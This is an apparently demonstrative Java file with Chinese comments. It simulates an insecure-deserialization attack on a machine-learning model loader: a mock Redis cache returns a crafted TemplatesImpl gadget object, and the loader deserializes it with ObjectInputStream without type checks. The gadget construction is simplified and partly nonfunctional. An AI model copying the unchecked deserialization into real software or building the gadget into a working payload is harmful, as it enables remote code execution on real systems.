import java.io.*;
import java.util.HashMap;
import java.util.Map;

// 模拟Redis缓存服务
class RedisCache {
    private static final Map<String, byte[]> storage = new HashMap<>();
    
    public static void set(String key, byte[] data) {
        storage.put(key, data);
    }
    
    public static byte[] get(String key) {
        // 模拟攻击者篡改数据
        if (key.equals("model:123:metadata")) {
            try {
                // 构造恶意序列化数据（模拟攻击者注入）
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                ObjectOutputStream oos = new ObjectOutputStream(bos);
                // 使用FastJSON历史漏洞链中的TemplatesImpl
                Object payload = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl")
                    .getDeclaredConstructor(new Class[]{})
                    .newInstance();
                // 设置恶意字节码（简化示例）
                java.lang.reflect.Field field = payload.getClass().getDeclaredField("_bytecodes");
                field.setAccessible(true);
                field.set(payload, new byte[][]{
                    Class.forName("java.lang.Runtime").getMethod("exec", String.class).getDeclaringClass().getResourceAsStream("/path/to/malicious.class").readAllBytes()
                });
                oos.writeObject(payload);
                oos.close();
                return bos.toByteArray();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return storage.get(key);
    }
}

// 本地+Redis缓存封装
class RedisAndLocalCache {
    public static Object get(String key) throws Exception {
        byte[] data = RedisCache.get(key);
        if (data == null) return null;
        // 不安全的反序列化操作
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
        return ois.readObject(); // 无类型校验
    }
}

// 机器学习模型元数据
class ModelMetadata implements Serializable {
    String modelName;
    int version;
    Map<String, String> columnComment; // 被污染字段
    
    public ModelMetadata(String modelName, int version) {
        this.modelName = modelName;
        this.version = version;
        this.columnComment = new HashMap<>();
    }
}

// 机器学习模型加载器
public class MLModelLoader {
    public static void main(String[] args) throws Exception {
        // 正常流程：加载模型元数据
        ModelMetadata metadata = (ModelMetadata) RedisAndLocalCache.get("model:123:metadata");
        if (metadata != null) {
            System.out.println("Loaded model: " + metadata.modelName);
            // 触发反序列化漏洞
            System.out.println("Column comment: " + metadata.columnComment.get("malicious"));
        }
    }
}